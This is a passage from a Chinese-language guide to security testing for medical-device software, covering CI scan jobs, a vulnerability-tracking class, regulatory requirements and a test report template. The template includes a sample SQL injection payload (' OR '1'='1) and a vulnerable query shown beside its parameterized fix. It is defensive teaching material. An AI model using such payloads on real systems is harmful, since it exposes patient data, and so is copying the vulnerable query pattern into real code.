# DAST扫描
dast:
  stage: security
  script:
    - docker run -t owasp/zap2docker-stable zap-baseline.py 
      -t https://staging.medical-device.com 
      -r zap-report.html
  artifacts:
    paths:
      - zap-report.html

# 容器扫描
container_scanning:
  stage: security
  script:
    - trivy image medical-device:latest --format json --output trivy-report.json
  artifacts:
    reports:
      container_scanning: trivy-report.json
```

### 4. 漏洞管理流程

```python
class VulnerabilityManagement:
    """漏洞管理系统"""
    
    def __init__(self):
        self.vulnerabilities = []
    
    def add_vulnerability(self, vuln):
        """添加漏洞"""
        vuln['id'] = self.generate_vuln_id()
        vuln['status'] = 'NEW'
        vuln['created_at'] = datetime.now()
        self.vulnerabilities.append(vuln)
    
    def assess_risk(self, vuln):
        """评估风险"""
        # CVSS评分
        cvss_score = self.calculate_cvss(vuln)
        
        # 根据CVSS评分确定严重程度
        if cvss_score >= 9.0:
            severity = 'CRITICAL'
        elif cvss_score >= 7.0:
            severity = 'HIGH'
        elif cvss_score >= 4.0:
            severity = 'MEDIUM'
        else:
            severity = 'LOW'
        
        vuln['cvss_score'] = cvss_score
        vuln['severity'] = severity
        
        return vuln
    
    def prioritize_remediation(self):
        """优先级排序"""
        # 按严重程度和可利用性排序
        sorted_vulns = sorted(
            self.vulnerabilities,
            key=lambda v: (
                self.severity_weight(v['severity']),
                v.get('exploitability', 0)
            ),
            reverse=True
        )
        
        return sorted_vulns
    
    def track_remediation(self, vuln_id, action):
        """跟踪修复进度"""
        vuln = self.find_vulnerability(vuln_id)
        if vuln:
            vuln['remediation_actions'].append({
                'action': action,
                'timestamp': datetime.now()
            })
            
            if action == 'FIXED':
                vuln['status'] = 'RESOLVED'
                vuln['resolved_at'] = datetime.now()
    
    def generate_report(self):
        """生成漏洞报告"""
        report = {
            'total': len(self.vulnerabilities),
            'by_severity': self.count_by_severity(),
            'by_status': self.count_by_status(),
            'top_vulnerabilities': self.prioritize_remediation()[:10]
        }
        return report
```

## 监管合规

### FDA网络安全指南

**上市前要求**:
1. 威胁建模和风险分析
2. 安全架构设计
3. 安全测试和验证
4. 软件物料清单（SBOM）
5. 漏洞管理计划

**上市后要求**:
1. 持续监控和更新
2. 漏洞披露
3. 补丁管理
4. 事件响应计划

### MDR网络安全要求

**Annex I, Section 17.4**:
- 网络安全风险管理
- 安全设计原则
- 安全测试和验证
- 漏洞管理

### HIPAA安全规则

**技术保护措施**:
- 访问控制（§164.312(a)(1)）
- 审计控制（§164.312(b)）
- 完整性控制（§164.312(c)(1)）
- 传输安全（§164.312(e)(1)）

## 安全测试报告模板

```markdown
# 安全测试报告

## 执行摘要

**产品**: 心电监护系统 v2.0  
**测试日期**: 2024-01-15  
**测试人员**: 安全团队  
**测试类型**: 渗透测试、SAST、DAST、模糊测试

**总体评估**: ⚠️ 发现中高危漏洞，需要修复后才能发布

## 漏洞摘要

| 严重程度 | 数量 | 状态 |
|---------|------|------|
| 严重 | 0 | - |
| 高危 | 3 | 待修复 |
| 中危 | 8 | 待修复 |
| 低危 | 15 | 已知风险 |

## 高危漏洞详情

### 漏洞 #1: SQL注入

**严重程度**: 高  
**CVSS评分**: 8.6  
**CWE**: CWE-89

**描述**:  
患者搜索接口存在SQL注入漏洞，攻击者可以通过构造恶意输入访问或修改数据库数据。

**位置**:  
`/api/patients/search?name=`

**复现步骤**:
1. 访问 `/api/patients/search?name=' OR '1'='1`
2. 观察返回所有患者数据

**影响**:  
- 数据泄露
- 数据篡改
- 潜在的数据库破坏

**修复建议**:
1. 使用参数化查询
2. 实施输入验证
3. 应用最小权限原则

**修复代码示例**:
```python
# 修复前（易受攻击）
query = f"SELECT * FROM patients WHERE name = '{name}'"
cursor.execute(query)

# 修复后（安全）
query = "SELECT * FROM patients WHERE name = ?"
cursor.execute(query, (name,))
```

## 测试方法

### 渗透测试
- 黑盒测试
- 使用OWASP Top 10作为测试基准
- 模拟外部攻击者

### 静态分析
- 工具: Bandit, SonarQube
- 扫描全部源代码
- 检查常见安全问题

### 动态分析
- 工具: OWASP ZAP
- 运行时漏洞检测
- API安全测试

### 模糊测试
- 工具: AFL, libFuzzer
- 测试HL7消息解析器
- 测试DICOM文件处理

## 建议

### 短期（1-2周）
1. 修复所有高危漏洞
2. 实施输入验证
3. 加强认证机制

### 中期（1-2月）
1. 修复中危漏洞
2. 实施安全编码培训
3. 建立安全测试流程

### 长期（3-6月）
1. 建立漏洞管理计划
2. 实施持续安全监控
3. 定期安全审计

## 附录

### A. 测试环境
- 操作系统: Ubuntu 20.04
- 测试工具版本
- 网络配置

### B. 完整漏洞列表
[详细的漏洞清单]

### C. 测试证据
[截图和日志]
```

## 总结

安全测试是医疗设备软件开发的关键环节。通过系统的安全测试，可以：

- ✅ 识别和修复安全漏洞
- ✅ 保护患者数据和隐私
- ✅ 防止设备被攻击或劫持
- ✅ 满足监管合规要求
- ✅ 建立安全文化

## 相关资源

- [测试策略概述](index.md)
- [性能测试](performance-testing.md)
- [测试自动化](test-automation.md)
- [硬件在环测试](hil-testing.md)

## 参考资料

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- FDA Cybersecurity Guidance: https://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- CWE Top 25: https://cwe.mitre.org/top25/
- CVSS Calculator: https://www.first.org/cvss/calculator/
